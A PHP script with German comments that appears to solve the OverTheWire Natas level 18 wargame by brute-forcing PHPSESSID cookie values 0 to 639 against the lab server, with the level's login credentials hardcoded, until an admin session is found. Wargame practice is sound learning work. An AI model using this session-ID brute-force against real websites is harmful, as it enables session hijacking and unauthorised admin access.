<?php


# Annahme: Wir müssen die Rechte der korrekten Session haben. Session['admin'] darf nicht NULL sein,
# aber immer wenn getestet wird, ob der aktuelle user admin Rechte hat, wird NULL zurückgegben.
# Das bedeutet dass der Else Zweig im Bsp. keine Option sein kann.
# Wir müssen die SessionID über eine bestehende Session bekommen, also über den richtigen Cookie.
# Da es nur 650 Möglichkeiten gibt, sollte das kein Problem sein.

# Tools: Curl-Api 
# Vorgehen: HTTP Request mit Cookie Value 1-640 abfeuern. und immer wenn bestimmter Text erscheint
# weiter. 

$url = "http://natas18.natas.labs.overthewire.org/";
$cred = "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ";
$ch = curl_init();


curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
curl_setopt($ch, CURLOPT_USERPWD,$cred);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);


for($i=0; $i < 640; $i++){
    
    $cookies = sprintf("PHPSESSID=%d",$i);

    curl_setopt($ch, CURLOPT_COOKIE,$cookies);

    curl_setopt($ch, CURLOPT_POSTFIELDS, "admin"); 
    echo "sent ID:$i\n";
    $res = curl_exec($ch);
    $len = strlen($res);
    echo "$len\n";
    if($len != 983){
        echo "$res\n";
        break;
    }
    # Seite neuladen
    curl_setopt($ch, CURLOPT_URL, $url);

}
curl_close($ch);

?>
